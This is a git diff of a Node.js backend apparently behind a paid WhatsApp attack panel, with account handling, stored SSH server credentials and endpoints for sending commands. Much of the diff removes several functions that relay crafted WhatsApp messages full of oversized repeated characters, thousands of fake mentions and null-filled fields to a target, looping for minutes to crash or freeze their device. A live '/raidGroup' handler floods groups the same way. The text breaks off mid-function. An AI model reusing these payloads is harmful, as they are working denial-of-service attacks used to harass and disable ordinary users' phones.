@@ -309,11 +309,10 @@ app.get("/", (req,res)=>{
   res.send("OK");
 });
 // Ganti listen jadi ini:
-const wsPort = 2061;
 
-const PORT = process.env.PORT || 2061;
+const PORT = process.env.PORT || 3000;
 
-server.listen(PORT, () => {
+app.listen("0.0.0.0", PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
 
@@ -461,10 +460,22 @@ fs.watch(VPS_FILE, () => {
 
 // Middleware: Cek sessionKey dan ambil username
 function getUserByKey(key) {
+  if (!key) return null; // cek key kosong
+
   const keyInfo = activeKeys[key];
+  if (!keyInfo) return null; // key tidak ditemukan
+
+  // optional: cek expired
+  if (keyInfo.expires && Date.now() > keyInfo.expires) {
+    delete activeKeys[key]; // hapus key expired
+    return null;
+  }
+
   const db = loadDatabase();
   const user = db.find(u => u.username === keyInfo.username);
-  return user ? keyInfo.username : null;
+  if (!user) return null; // user tidak ditemukan
+
+  return keyInfo.username; // aman
 }
 
 // GET /myServer
@@ -476,21 +487,25 @@ app.get("/myServer", (req, res) => {
   const userVPS = vpsList.filter(vps => vps.owner === username);
   res.json(userVPS);
 });
-
 // POST /addServer
 app.post("/addServer", (req, res) => {
   const { key, host, username: sshUser, password } = req.body;
   const owner = getUserByKey(key);
   if (!owner) return res.status(401).json({ error: "Invalid session key" });
 
-  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });
+  if (!host || !sshUser || !password) {
+    return res.status(400).json({ error: "Missing fields" });
+  }
+
+  const exists = vpsList.find(vps => vps.host === host && vps.owner === owner);
+  if (exists) return res.status(400).json({ error: "VPS already exists" });
 
   const newVPS = { host, username: sshUser, password, owner };
   vpsList.push(newVPS);
+
   fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
   res.json({ success: true, message: "VPS added" });
 });
-
 // POST /delServer
 app.post("/delServer", (req, res) => {
   const { key, host } = req.body;
@@ -499,10 +514,13 @@ app.post("/delServer", (req, res) => {
 
   const before = vpsList.length;
   vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
-  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
 
-  const deleted = before !== vpsList.length;
-  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
+  if (before === vpsList.length) {
+    return res.json({ success: false, message: "VPS not found" });
+  }
+
+  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
+  res.json({ success: true, message: "VPS deleted" });
 });
 
 // POST /sendCommand
@@ -712,7 +730,7 @@ app.get("/raidGroup", async (req, res) => {
     const raidBot = async (sock, groupJid) => {
       for (let round = 0; round < 2; round++) {
         const sentMsg = await sock.sendMessage(groupJid, {
-          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
+          text: `[Rvs Project]\n` + 'ꦾ'.repeat(30000)
         });
         await new Promise(r => setTimeout(r, 1000));
 
@@ -870,16 +888,33 @@ const news = [
 
 // ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
 app.post("/validate", (req, res) => {
-const { username, password, version, androidId } = req.body;
+  const { username, password, androidId } = req.body;
+  const db = loadDatabase();
+  const user = db.find(u => u.username === username && u.password === password);
 
-if (!androidId) {
-  return res.json({ valid: false, message: "androidId required" });
-}
+  if (!user) {
+    return res.json({ valid: false });
+  }
 
-const db = loadDatabase();
-const user = db.find(u => u.username === username && u.password === password);
+  // Jika androidId belum ada, otomatis isi
+  if (!user.androidId && androidId) {
+    user.androidId = androidId;
+    saveDatabase(db);
+  }
 
-if (!user) return res.json({ valid: false });
+  // Bisa juga cek expired
+  const expired = new Date(user.expiredDate);
+  const now = new Date();
+  const expiredFlag = now > expired;
+
+  return res.json({
+    valid: true,
+    expired: expiredFlag,
+    username: user.username,
+    role: user.role,
+    androidId: user.androidId
+  });
+});
 
 if (isExpired(user)) {
   return res.json({ valid: true, expired: true });
@@ -1263,6 +1298,7 @@ app.get("/createAccount", (req, res) => {
     password: pass,
     expiredDate: expired.toISOString().split("T")[0],
     role: "member",
+    androidId: androidId || null
   };
 
   db.push(newAccount);
@@ -1379,6 +1415,7 @@ app.get("/userAdd", (req, res) => {
     password,
     role: role || "member",
     expiredDate: expired.toISOString().split("T")[0],
+    androidId: androidId || null
   };
 
   db.push(newUser);
@@ -1516,674 +1553,8 @@ async function importFromRawEncrypted(url) {
 
 let bugWa;
 
-async function xCursedDocu(sock, target) {
-  await sock.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "ꦾ".repeat(77777), 
-            documentMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-              fileLength: "9999999999999",
-              pageCount: 9007199254740991,
-              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-              fileName: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶",
-              caption: "ꦽ".repeat(25000),
-              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1723855952",
-              contactVcard: false,
-              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
-            },
-            hasMediaAttachment: true,
-          },
-          body: {
-            text: "ោ៝".repeat(20000),
-          },
-          contextInfo: {
-            participant: target,
-            mentionedJid: [
-              "131338822@s.whatsapp.net",
-            ],
-            remoteJid: "X",
-            participant: target,
-            stanzaId: "1234567890ABCDEF",
-            quotedMessage: {
-              paymentInviteMessage: {
-                serviceType: 3,
-                expiryTimestamp: Date.now() + 1814400000
-              },
-            },
-          },
-          nativeFlowMessage: {
-            messageParamsJson: "{}",
-            messageVersion: 3,
-            buttons: [
-              {
-                name: "single_select",
-                buttonParamsJson: "",
-              },              
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  icon: "DOCUMENT",
-                  flow_cta: "ꦽ".repeat(100000),
-                  flow_message_version: "3"
-                })
-              }
-            ]
-          }
-        }
-      }
-    } 
-  }, { 
-    messageId: null,
-    participant: { jid: target } 
-  });
-}
+//function Bug pake sock,target
 
-
-async function QQSMessageClose(sock, target) {
-  const qpayment = {
-    key: {
-      remoteJid: '0@s.whatsapp.net',
-      fromMe: false,
-      id: 'ownername',
-      participant: '0@s.whatsapp.net'
-    },
-    message: {
-      requestPaymentMessage: {
-        currencyCodeIso4217: "USD",
-        amount1000: 999999999,
-        requestFrom: '0@s.whatsapp.net',
-        noteMessage: {
-          extendedTextMessage: {
-            text: 'OmhcMbud QQS'
-          }
-        },
-        expiryTimestamp: 999999999,
-        amount: {
-          value: 91929291929,
-          offset: 1000,
-          currencyCode: "INR"
-        }
-      }
-    }
-  };
-  
-  let msg = await generateWAMessageFromContent(target, qpayment, {});
-  
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target },
-    messageId: msg.key.id
-  });
-  
-  console.log("저스틴𝔲𝔦 𝔖𝔶𝔰𝔱𝔢𝔪𝔞𝔱𝔦𝔠巛⚰︎⃟⃟🩸");
-}
-
-
-async function iOSInvisble(sock, target) {
-const MakLo1 = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-              message: {
-                locationMessage: {
-                  degreesLatitude: -66.666,
-                  degreesLongtitude: 66.666, 
-                  name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(25000),
-                  address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(25000),
-                  jpegThumbnail: null,
-                  url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
-                  contextInfo: {
-                    participant: target,
-                    forwardingScore: 1,
-                    isForwarded: true,
-                    stanzaId: target,
-                    mentionedJid: [target]
-                  },
-                },
-              },
-            },
-          }, {});
-          
-const MakLo2 = {
-requestPhoneNumberMessage: {
-              contextInfo: {
-                quotedMessage: {
-                  documentMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-                    mimetype: "application/pdf",
-                    fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-                    fileLength: 0,
-                    pageCount: 0,
-                    mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-                    fileName: "sock.Cft",
-                    fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-                    directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-                    mediaKeyTimestamp: 1737369406,
-                    caption: "By@MAkLoo",
-                    title: "By@MAkLoo",
-                    mentionedJid: [target],
-                  }
-                },
-                externalAdReply: {
-                  title: "By@MAkLoo",
-                  body: "𑇂𑆵𑆴𑆿".repeat(30000),
-                  mediaType: "VIDEO",
-                  renderLargerThumbnail: true,
-                  sourceUrl: "https://t.me/NandoOfficiali",
-                  mediaUrl: "https://t.me/NandoOfficiali",
-                  containsAutoReply: true,
-                  renderLargerThumbnail: true,
-                  showAdAttribution: true,
-                  ctwaClid: "ctwa_clid_example",
-                  ref: "ref_example"
-                },
-                forwardedNewsletterMessageInfo: {
-                  newsletterJid: "@newsletter",
-                  serverMessageId: 1,
-                  newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
-                  contentType: "UPDATE",
-                },
-              },
-              skipType: 7,
-            },
-          };
-          
-const MakLo3 = {
-extendedTextMessage: {
-      text: `You are ready?\n${"𑇂𑆵𑆴𑆿".repeat(50000)}`, 
-      matchedText: "Destroy Your Device",
-      description: "𑇂𑆵𑆴𑆿".repeat(9000),
-      title: "𑇂𑆵𑆴𑆿".repeat(9000),
-      textArgb: Math.random() * 2000,
-      backgroundArgb: Math.random() * 2000,
-      font: "SYSTEM", 
-      inviteLinkGroupType: "DEFAULT", 
-      jpegThumbnail: null, 
-      contextInfo: {
-        statusSourceType: "TEXT", 
-        statusAttributionType: "RESHARED_FROM_MENTION", 
-        statusAttributions: [
-          {
-            type: "STATUS_MENTION",
-            music: {
-              authorName: `You are ready?\n${"𑇂𑆵𑆴𑆿".repeat(50000)}`, 
-              songId: "1137812656623908",
-              title: "𑇂𑆵𑆴𑆿".repeat(9000),
-              author: "𑇂𑆵𑆴𑆿".repeat(9000),
-              artistAttribution: "𑇂𑆵𑆴𑆿".repeat(9000),
-              isExplicit: true
-            },
-          },
-        ],
-      },
-    },
-  };
-  
-  for (const msg of [MakLo1, MakLo2, MakLo3]) {
-    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
-      messageId: msg.key?.id || undefined,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{ tag: "to", attrs: { jid: target } }]
-        }]
-      }]
-    });
-    console.log(chalk.green("Send Bug Delay Invisible"));
-  }
-}
-
-async function MakLooo(sock, target){
-const startTime = Date.now();
-const duration = 10 * 60 * 1000;
-while (Date.now() - startTime < duration) {
-for (let i = 0; i < 100; i++) {
-const mentionedJids = Array.from({ length: 2000 }, (_, i) => `638${i + 1}478${i + 1}@s.whatsapp.net`);
-  const NanMsg1 = {
-    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
-    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
-    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
-    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
-    "mimetype": "image/webp",
-    "height": 512,
-    "width": 512,
-    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
-    "fileLength": "37824",
-    "mediaKeyTimestamp": "1771680407",
-    "isAnimated": false,
-    "stickerSentTs": "1771694793768",
-    "isAvatar": true,
-    "isAiSticker": true,
-    "isLottie": false,
-    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAQIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k=",
-    contextInfo: {
-      mentionedJid: mentionedJids,
-      pairedMediaType: "HD_IMAGE_CHILD",
-      statusSourceType: "MUSIC_STANDALONE",
-      statusAttributions: [
-        {
-          type: "STATUS_MENTION",
-          music: {
-            authorName: "Maklo Scamer",
-            songId: "1137812656623908",
-            title: "\u0000".repeat(1500),
-            author: "\u0000".repeat(1500),
-            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
-            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
-            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
-            artworkMediaKey: "1771689153",
-            artistAttribution: " x ",
-            isExplicit: true
-          }
-        }
-      ]
-    },
-    annotations: [
-      {
-        embeddedContent: {
-          embeddedMusic: {
-            musicContentMediaId: "589608164114571",
-            songId: "870166291800508",
-            title: "\u0003".repeat(1500),
-            author: "\u0003".repeat(1500),
-            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
-            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
-            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
-            artistAttribution: "https://t.me/null",
-            countryBlocklist: true,
-            isExplicit: true,
-            artworkMediaKey: "1771689153"
-          }
-        },
-        embeddedAction: true
-      }
-    ]
-  };
-
-  await sock.relayMessage("status@broadcast", {
-    stickerMessage: NanMsg1
-  },
-  {
-    statusJidList: [target]
-  });
-
-const NanMsg2 = {
-      nativeFlowResponseMessage: {
-        name: "call_permission_request",
-        paramsJson: "\u0000".repeat(1045000),
-        version: 3,
-        entryPointConversionSource: "StatusMessage",
-      },
-      forwardingScore: 0,
-      isForwarded: false,
-      font: Math.floor(Math.random() * 9),
-      background: `#${Math.floor(Math.random() * 16777215)
-        .toString(16)
-        .padStart(6, "0")}`,
-
-      audioMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
-        mimetype: "audio/mpeg",
-        fileSha256: Buffer.from([
-          226, 213, 217, 102, 205, 126, 232, 145,
-          0, 70, 137, 73, 190, 145, 0, 44,
-          165, 102, 153, 233, 111, 114, 69, 10,
-          55, 61, 186, 131, 245, 153, 93, 211,
-        ]),
-        fileLength: 432722,
-        seconds: 26,
-        ptt: false,
-        mediaKey: Buffer.from([
-          182, 141, 235, 167, 91, 254, 75, 254,
-          190, 229, 25, 16, 78, 48, 98, 117,
-          42, 71, 65, 199, 10, 164, 16, 57,
-          189, 229, 54, 93, 69, 6, 212, 145,
-        ]),
-        fileEncSha256: Buffer.from([
-          29, 27, 247, 158, 114, 50, 140, 73,
-          40, 108, 77, 206, 2, 12, 84, 131,
-          54, 42, 63, 11, 46, 208, 136, 131,
-          224, 87, 18, 220, 254, 211, 83, 153,
-        ]),
-        directPath:
-          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
-        mediaKeyTimestamp: 1746275400,
-
-        contextInfo: {
-          mentionedJid: Array.from(
-            { length: 1900 },
-            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-          ),
-          isSampled: true,
-          participant: target,
-          remoteJid: "status@broadcast",
-          forwardingScore: 9741,
-          isForwarded: true,
-          businessMessageForwardInfo: {
-            businessOwnerJid: "0@s.whatsapp.net",
-          },
-        },
-      },
-    };
-
-    const msg = generateWAMessageFromContent(
-      target,
-      {
-        ...NanMsg2,
-        contextInfo: {
-          ...NanMsg2.contextInfo,
-          participant: "0@s.whatsapp.net",
-          mentionedJid: [
-            "0@s.whatsapp.net",
-            ...Array.from(
-              { length: 1900 },
-              () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
-            ),
-          ],
-        },
-      },
-      {}
-    );
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: [],
-                },
-              ],
-            },
-          ],
-        },
-      ],
-    });
-
-sock.relayMessage("status@broadcast", 
-{
-  "videoMessage": {
-    "url": "https://mmg.whatsapp.net/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0&mms3=true",
-    "mimetype": "video/mp4",
-    "fileSha256": "K+ztV1kPJ/IPdUJnOKRSnd7ph77fEgy71KPmhcFUbpc=",
-    "fileLength": "1332709",
-    "seconds": 86400,
-    "mediaKey": "MALF+tSSTMZufgmOofb86Z7LrumE0497jUjW82fhONI=",
-    "caption": "ꦽ".repeat(50000),
-    "height": 9999,
-    "width": 99999,
-    "fileEncSha256": "EiF137hLTwxdgGdtEJ8XqKmVatX8672vNrmI/vJyaXM=",
-    "directPath": "/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0",
-    "mediaKeyTimestamp": "1770563783",
-    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//aAAgBAQABPwCYWP8AqL0SKgRVUcARCW3saIjFlbfIPImfUmVQzAfUkbQXp133z5jU8DALuQJlWWoF6PzFdSEI/kTILrWWQbYTFLuhDgd5mVGq519jE6O/V+I2tnXl4DzcI4+hviY1DK6tZtvb2EOtQmtSAOTPFPVvD5DmYFiVOGPYSu0WgkEESzxO/GvcFAU3KvGkt7Ck9Uxb7bs9yQQAJnsHy7NxlZT3HkvM6zsAntKLXxnQsT0k8TxUKbw6nYcTAya6X06c/wBpdmY9Wymi3RzLHLuz+5lS23UumgxEI0SJV98s+9ZmcVyz01XyfKj098aYXrD/AJSz9x/kz//EABYRAQEBAAAAAAAAAAAAAAAAACARQf/aAAgBAgEBPwA06f/EABsRAQACAgMAAAAAAAAAAAAAAAECIAMREjFB/9oACAEDAQE/AKxhzHT1UExqPtf/2Q==",
-    "contextInfo": {
-      "pairedMediaType": "NOT_PAIRED_MEDIA",
-      "statusSourceType": "VIDEO"
-    },
-    "streamingSidecar": "NcqOmk1FiSxZ1drVtpZhrx6JIcq6FkrdJZFyBrm3oDb2K4j6qsx16UlVSWSG/eaDEfMh4HcR7Yt99IprZfoOu/r/MvtPtopjpUyz/vjWIwsKhhH/yTo2+2NXxTY3NoWJLB46yQ8LXXGb6aM5D+IlwRZYF5Td2E9PxRHWsyjU580kSok5moVXt1fOCIArItLm3gqpowXyNllSXDc8xBNVkmjznPq23bAzfWsB4HlTxdLJxTr5W7wvNGv/urgz2LdXlyxbLjzGBE+HWVC+sLbIuo0s"
-  }
-},
-{}
-);
-
-const NanMsg4 = {
-      nativeFlowResponseMessage: {
-        name: "call_permission_request",
-        paramsJson: "\u0000".repeat(1045000),
-        version: 3,
-        entryPointConversionSource: "galaxy_message",
-      },
-      forwardingScore: 0,
-      isForwarded: false,
-      font: Math.floor(Math.random() * 9),
-      background: `#${Math.floor(Math.random() * 16777215)
-        .toString(16)
-        .padStart(6, "0")}`,
-
-      audioMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
-        mimetype: "audio/mpeg",
-        fileSha256: Buffer.from([
-          226, 213, 217, 102, 205, 126, 232, 145,
-          0, 70, 137, 73, 190, 145, 0, 44,
-          165, 102, 153, 233, 111, 114, 69, 10,
-          55, 61, 186, 131, 245, 153, 93, 211,
-        ]),
-        fileLength: 432722,
-        seconds: 26,
-        ptt: false,
-        mediaKey: Buffer.from([
-          182, 141, 235, 167, 91, 254, 75, 254,
-          190, 229, 25, 16, 78, 48, 98, 117,
-          42, 71, 65, 199, 10, 164, 16, 57,
-          189, 229, 54, 93, 69, 6, 212, 145,
-        ]),
-        fileEncSha256: Buffer.from([
-          29, 27, 247, 158, 114, 50, 140, 73,
-          40, 108, 77, 206, 2, 12, 84, 131,
-          54, 42, 63, 11, 46, 208, 136, 131,
-          224, 87, 18, 220, 254, 211, 83, 153,
-        ]),
-        directPath:
-          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
-        mediaKeyTimestamp: 1746275400,
-
-        contextInfo: {
-          mentionedJid: Array.from(
-            { length: 1900 },
-            () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
-          ),
-          isSampled: true,
-          participant: target,
-          remoteJid: "status@broadcast",
-          forwardingScore: 9741,
-          isForwarded: true,
-          businessMessageForwardInfo: {
-            businessOwnerJid: "0@s.whatsapp.net",
-          },
-        },
-      },
-    };
-
-    const msgr = generateWAMessageFromContent(
-      target,
-      {
-        ...NanMsg4,
-        contextInfo: {
-          ...NanMsg4.contextInfo,
-          participant: "0@s.whatsapp.net",
-          mentionedJid: [
-            "0@s.whatsapp.net",
-            ...Array.from(
-              { length: 1900 },
-              () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
-            ),
-          ],
-        },
-      },
-      {}
-    );
-
-    await sock.relayMessage("status@broadcast", msgr.message, {
-      messageId: msgr.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: [],
-                },
-              ],
-            },
-          ],
-        },
-      ],
-    });
- 
- 
-const imageCrash = "https://files.catbox.moe/ykvioj.jpg";
-
-  const mentionedMetaAi = [
-    "13135550001@s.whatsapp.net",
-    "13135550002@s.whatsapp.net",
-    "13135550003@s.whatsapp.net",
-    "13135550004@s.whatsapp.net",
-    "13135550005@s.whatsapp.net",
-    "13135550006@s.whatsapp.net",
-    "13135550007@s.whatsapp.net",
-    "13135550008@s.whatsapp.net",
-    "13135550009@s.whatsapp.net",
-    "13135550010@s.whatsapp.net"
-  ];
-
-  const photo = {
-    image: { url: imageCrash },
-    caption: "ꦾ".repeat(60000)
-  };
-
-  const album = await generateWAMessageFromContent(target, {
-    albumMessage: {
-      expectedImageCount: 999,
-      expectedVideoCount: 666
-    }
-  }, {
-    userJid: target,
-    upload: sock.waUploadToServer
-  });
-
-  await sock.relayMessage("status@broadcast", album.message, { messageId: album.key.id });
-
-    const msgj = await generateWAMessage(target, photo, {
-      upload: sock.waUploadToServer
-    });
-
-    const type = Object.keys(msgj.message).find(t => t.endsWith('Message'));
-
-    msgj.message[type].contextInfo = {
-      mentionedJid: [
-        ...mentionedMetaAi,
-        ...Array.from({ length: 1900 }, () =>
-          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-        )
-      ],
-      businessMessageForwardInfo: {
